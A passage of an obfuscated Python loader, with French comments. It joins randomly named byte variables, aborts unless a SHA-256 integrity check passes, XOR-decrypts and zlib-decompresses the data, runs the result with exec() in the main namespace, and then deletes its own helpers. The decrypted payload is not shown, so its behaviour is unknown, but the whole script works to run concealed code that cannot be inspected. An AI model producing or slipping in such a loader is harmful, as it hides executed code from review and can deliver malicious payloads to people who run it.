_cqd1uXAB5WnQaQ + _cyIAqN72i9ICoF + _cmF5c33GgJd16K + _coOb2GA7EvgYiu + _clJH6DNhPdgNKA + _co38bGmFo0v_rT + _cchSyxwh_Z0kpy + _cgUtu0421K6kwq + _cjgY84zmFVpRc5 + _clFgSPiuv3tt5R + _cbvnaEzJ466oqH + _csM5mL2EdfC6g2 + _cc1V5c1TbDLRWJ + _crpaZ9psthSCUu + _cc7pVO1Chpwma8 + _cxVZKqBSMDfNSl + _ctEnAQxTXiXTCC + _cmn5H3AIRRmUGb + _csqu91phNwjM02 + _cyIg_5B1JSyaWN + _c_6nj4jlQ9Ik8D + _cotrMbw6pbfWlT + _cjInAq3WAXWXGi + _cvmIBLPuXCUJvK + _cjZUfs8Vz7WL94 + _cunENKwehaDlin + _ciICFUIdQ60CFy + _cqI7k9DYcBKb0p + _coPAJGlq8XbkvO + _c_RG66dkmNsugH + _caXKl3ceOdosZ3 + _ck4QCiRq4ENnP6 + _ceMfpWOVxt4OSv + _cnsXA30yCDg39m + _cdS8GhtXvVKle8 + _caJa_JTWuEVsF_ + _cePEGcdTrqHmKm + _csY7B2k0G2a53m + _ca7d_JpJ2Mivcd + _cxvVxlvAe_ilhb + _cdXRaYDrrU2sHU + _ctzpaZUl6kI8gM + _clc8KVsBti3pAR + _cnreZQuhbHeU7R + _caKodmlsa9Ygfp + _ccwhFDhUVU1u8t + _cppCanewuBZmye + _cv_Fvz3I4HTkm1 + _cfMp11mDjjMyaU + _ct1SLuPi8YTHHr + _cuKbusP1KVvJ_g + _cleebl2tQHJqKy + _cqEVs4eiAs8PVH + _cwlqJ25SbLsXXE + _ca3BzubRKZZfmX + _cwe4Q_qr8RDKRO + _cqTy8NrCPuE9rT + _cjoNRvxQqHaxvj + _cvkFI_1ftjGmSX + _cqpKPxwZAHhJjh + _ciVssD9kiymLiS + _cjCoEYQYhHKv6F + _chuuYome5LQvD0 + _coVdIfAID6Pmlq + _crc0mALmO4Jegd + _cgBUPifpYwuRqB + _ckj3xYIrbBXbYk + _crnWHV_lTHyXDp + _cbsY9Hn5507KT9 + _cj7JVAFbjwYmFt + _cbhhI10ionfv9j + _czR06YIFOZqS1j + _chCSnIkBBzkOIs + _cgimkujWg1dfp0 + _ciQ3sD6HBU372G + _cjsvftqPTR06bl + _ck6P4VhfT136rO + _cwQ5oFTY9tAcsv + _cg41NM1At2waba + _cjTn7SPkMXV8kW + _ca43vnHE2ktdCX + _cqmqdB2sjcyo6R + _crcW2tUcM5_RzH + _cfGjtgcTrA4Hti + _cv81T0hIHl1qBL + _cqVctqeUCls4lu + _cnzroM1qkeCVAp + _cxzQzJhBqbN_JE + _cafbwnWxeUvKVF + _cf5kJXRTDpw9OO + _cyYnHdZC9wwrOi + _cy2HZZJ_eG4IOf + _cywb5MZNy6WMCQ + _c_W2IiLtDxHZyg + _cvnjtaBywuXhpR + _ca4J9nfGwDfnkK + _cjCSp36NAMTMyJ + _cl8cUMuwo6sh4_ + _cawtVBqfVs6QkS + _cp4W2N8RwRuJ2M + _coNku8dC9Ez2__ + _clAwBxbXFwuzTB + _cqpfGYUCtXI81z + _cpNmBj3EmtsWex + _czbHdmGAc9cesW + _ccWZ5uzNdy8pxZ + _csaZyIyXTHaJwr + _csByVWMUqqtdk5 + _ccef4fbZ96TX_H + _clzoAZBa9PO1Vw + _cfLJl59yVUWN9R + _cz9ZfZpIPojMnd + _chvr9MhAp5nHvz)
if __import__('hashlib').sha256(_pvQqsyoH6mlreu).hexdigest() != 'a3a74f8ee7e334ae496fd05d9c234677e4599bbdd66d30756b7e30557c4b4da6':
    __import__('sys').exit(1)
_xpuMr37GY6U2zy = bytes([242, 11, 196, 186, 16, 86, 99, 73, 52, 209, 173, 252, 215, 152, 219, 6, 120, 102, 19, 94, 217, 95, 134, 6, 120, 55, 169, 244, 8])
_fkpex__8iTgoYRZ = bytes([194, 236, 150, 190, 192, 246, 27, 101, 121, 37, 0, 72, 22, 108, 186, 83, 43, 96, 176, 49, 171, 99, 213, 251, 215, 231, 32, 201, 135])

def _fxhUqNgMwJdLGN3(_bhK09o331SP0Ps, _kwL4mxOJqCmWDa):
    return bytes(_bhK09o331SP0Ps[_ik0145IkNVp_Ga] ^ _kwL4mxOJqCmWDa[_ik0145IkNVp_Ga % len(_kwL4mxOJqCmWDa)] for _ik0145IkNVp_Ga in range(len(_bhK09o331SP0Ps)))

def _fdfTBtlCOsSHwwN(_t_gG0DsU2tok_y):
    import zlib
    return zlib.decompress(_t_gG0DsU2tok_y) # Un seul niveau de zlib ici pour simplifier

def _ferJhgGkzhaT3CH():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xqJRel57XjkBxm = _fxhUqNgMwJdLGN3(_pvQqsyoH6mlreu, _xpuMr37GY6U2zy)
    # 2. Décompression Zlib
    _dslxQdfkk12_5p = _fdfTBtlCOsSHwwN(_xqJRel57XjkBxm)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dslxQdfkk12_5p.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nal8KFIcS63tX2 = _main.__dict__
    _nal8KFIcS63tX2.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nal8KFIcS63tX2)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_ferJhgGkzhaT3CH()
try:
    del _fxhUqNgMwJdLGN3, _fdfTBtlCOsSHwwN, _ferJhgGkzhaT3CH
    del _pvQqsyoH6mlreu, _xpuMr37GY6U2zy, _fkpex__8iTgoYRZ
except:
    pass
